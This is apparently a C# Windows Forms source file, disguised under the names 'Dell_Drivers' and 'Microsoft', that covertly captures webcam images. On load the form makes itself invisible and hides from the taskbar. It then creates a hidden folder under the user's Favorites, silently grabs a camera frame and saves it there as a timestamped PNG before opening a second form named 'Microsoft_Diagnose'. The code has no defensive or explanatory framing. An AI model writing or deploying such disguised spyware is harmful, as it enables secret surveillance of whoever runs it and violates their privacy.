using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Emgu.CV;
using Emgu.CV.Structure;

namespace Dell_Drivers
{
    public partial class Microsoft : Form
    {
        public Microsoft()
        {
            InitializeComponent();
            this.Opacity = 0;
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;
        }


        private Emgu.CV.Capture capture;

        private void Microsoft_Load(object sender, EventArgs e)
        {
            DateTime now = DateTime.Now;

            //String fileloc = "C:\\windows\\logs\\telephony\\Snaps";
            String fileloc = "C:\\Users\\" + global.currentUser + "\\Favorites\\Links\\Snaps";


            if (!Directory.Exists(fileloc))
            {                
                //Directory.CreateDirectory(fileloc);
                DirectoryInfo di = Directory.CreateDirectory(fileloc);
                di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
            }

            if (Directory.Exists(fileloc))
            {
                try
                {
                    capture = new Emgu.CV.Capture();

                    Image<Bgr, Byte> ImageFrame = capture.QuerySmallFrame();
                    imageBox1.Image = ImageFrame;



                    int width = Convert.ToInt32(1920);
                    int height = Convert.ToInt32(1080);
                    Bitmap bmp = new Bitmap(width, height);
                    imageBox1.DrawToBitmap(bmp, new Rectangle(0, 0, 1920, 1080));
                    bmp.Save("C:\\Users\\" + global.currentUser + "\\Favorites\\Links\\Snaps\\" + DateTime.Now.ToString("dd MMM yyyy_hh mm ss tt") + ".png", ImageFormat.Png);

                    Microsoft_Diagnose f35 = new Microsoft_Diagnose();
                    f35.ShowDialog();

                    this.Close();
                    GC.Collect();
                }
                catch
                {
                    this.Close();
                    GC.Collect();
                }
            }

            
            
        }

        private void imageBox1_Click(object sender, EventArgs e)
        {

        }
    }
}
